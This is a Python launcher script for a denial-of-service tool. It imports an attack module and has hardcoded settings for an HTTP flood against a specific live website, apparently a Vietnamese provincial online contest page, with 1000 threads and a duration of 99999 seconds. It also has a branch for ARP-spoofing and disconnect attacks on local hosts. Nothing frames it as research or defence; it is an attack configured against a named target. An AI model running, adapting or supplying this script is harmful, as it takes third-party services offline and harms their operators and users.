"""Main script to start GUI DoS attack application."""

# -*- coding: utf-8 -*-
import os
import sys

from colorama import Fore

os.chdir(os.path.dirname(os.path.realpath(__file__)))
os.system("cls" if os.name == "nt" else "clear")

try:
    from tools.addons.checks import (check_http_target_input,
                                     check_local_target_input,
                                     check_method_input, check_number_input)
    from tools.addons.ip_tools import show_local_host_ips
    from tools.addons.logo import show_logo
    from tools.method import AttackMethod
except (ImportError, NameError) as err:
    print("\nFailed to import something", err)


def main() -> None:
    """Run main application with predefined values."""
    # Predefined settings
    method = "http"  # Method for HTTP DoS attack
    target = "https://80namqdnd-tdbn.com/cuoc-thi/cuoc-thi-truc-tuyen-tinh-doan-bac-ninh-1"  # Target URL
    threads = 1000  # Number of threads
    time = 99999  # Duration of attack (in seconds)
    sleep_time = 0  # Sleep time (not used for HTTP method)

    # Display logo
    show_logo()

    try:
        if method in ["arp-spoof", "disconnect"]:
            show_local_host_ips()

        # Start attack with predefined values
        with AttackMethod(
            duration=time,
            method_name=method,
            threads=threads,
            target=target,
            sleep_time=sleep_time,
        ) as attack:
            attack.start()

    except KeyboardInterrupt:
        print(
            f"\n\n{Fore.RED}[!] {Fore.MAGENTA}Ctrl+C detected. Program closed.\n\n{Fore.RESET}"
        )
        sys.exit(1)


if __name__ == "__main__":
    main()
